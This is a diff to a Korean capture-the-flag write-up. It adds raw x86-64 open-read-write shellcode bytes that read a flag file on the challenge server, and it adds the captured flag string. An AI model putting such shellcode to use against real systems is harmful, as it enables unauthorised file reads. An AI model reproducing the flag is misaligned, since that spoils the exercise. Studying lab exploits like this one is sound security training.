@@ -107,7 +107,22 @@ print(p.recvall(timeout=3).decode())        # 플래그 출력
 p.close()
 ```
 
-> 이 셸코드를 어셈블리로 한 바이트씩 짤 수도 있는데, pwntools에 shellcraft라는 기능이 있어서 open, read, write 이렇게 함수처럼 불러주면 셸코드를 자동으로 만들어 줍. 그래서 세 줄로 ORW 셸코드를 완성함.
+```python
+#추가한 바이트
+shellcode = (
+    b"\x48\x31\xc0\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48"
+    b"\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c"
+    b"\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50"
+    b"\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31"
+    b"\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89"
+    b"\xe6\x48\x81\xee\x00\x01\x00\x00\xba\x00\x01\x00\x00\x48\x31\xc0"
+    b"\x0f\x05\x48\x89\xc2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x0f"
+    b"\x05"
+)
+```
+
+> 이 셸코드를 어셈블리로 한 바이트씩 짤 수도 있는데, pwntools에 shellcraft라는 기능이 있어서 open, read, write 이렇게 함수처럼 불러주면 셸코드를 자동으로 만들어 준다. 그래서 세 줄로 ORW 셸코드를 완성함.
+> 처음에 이 코드로 python을 실행했을 때, 발생함. 그래서 open→read→write 어셈블리를 nasm으로 돌려서 뽑은 기계어(바이트)를 추가했다.
 
 ### 실행 순서
 
@@ -144,6 +159,11 @@ p.close()
 ---
 
 ## 획득한 플래그
+
+![alt text](image.png)
+[flag] DH{ca562d7cf1db6c55cb11c4ec350a3c0b}
+
+![alt text](image-1.png)
 
 ## 6. 정리
 
